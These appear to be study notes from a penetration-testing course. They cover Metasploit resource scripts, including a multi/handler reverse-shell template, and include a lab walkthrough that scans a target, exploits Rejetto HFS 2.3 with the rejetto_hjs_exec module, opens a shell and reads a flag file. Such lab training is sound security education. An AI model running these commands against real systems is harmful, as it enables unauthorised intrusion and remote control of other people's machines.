
- Allow for Automation of repetitive tasks

```
ls -al /usr/share/metasploit-framework/scripts/resource/
```

Setup RC (resource) Script
```
nano <rc_file>
use multi/handler
set PAYLOAD <payload_choice>
set LHOST <local_host>
set LPORT <local_port>
exploit
```

Launch script
```
msfconsole -r <rc_file>
```

Load script from msfconsole
```
msfconsole 
resource <path_to_rc_file>
```

Create resource file in msfconsole 
```
makerc <resource_file_dir>
```
## Quiz

Which one of the following Msfconsole commands can be used to load a resource script?

	resource ~/Desktop/handler.rc


## Overview

A Kali GUI machine and a target machine running a vulnerable HTTP File Server server are provided to you. The IP address of the target machine is provided in a text file named target placed on the Desktop of the Kali machine (/root/Desktop/target).  

Your task is to fingerprint the application using the tools available on the Kali machine and then exploit the application using the appropriate Metasploit module.

Objective: Exploit the application and retrieve the flag!

```
nmap -sV -sC -T 4 -v 10.4.23.123

PORT      STATE SERVICE            VERSION
80/tcp    open  http               HttpFileServer httpd 2.3
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: HFS 2.3
|_http-title: HFS /
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=WIN-OMCNBKR66MN
| Issuer: commonName=WIN-OMCNBKR66MN
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-12T01:53:46
| Not valid after:  2025-02-11T01:53:46
| MD5:   a654 1621 abd2 4df9 b11c d91f 78d1 0733
|_SHA-1: e0ae 811d d012 babd fc37 a8bc 0826 e7bd f246 4da3
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-08-13 07:30:42
|_  start_date: 2024-08-13 07:22:2
```   

```
service postgresql start && msfconsole 
search rejetto
use exploit/windows/http/rejetto_hjs_exec
exploit
```

```
shell 
cd /
more flag.txt
```


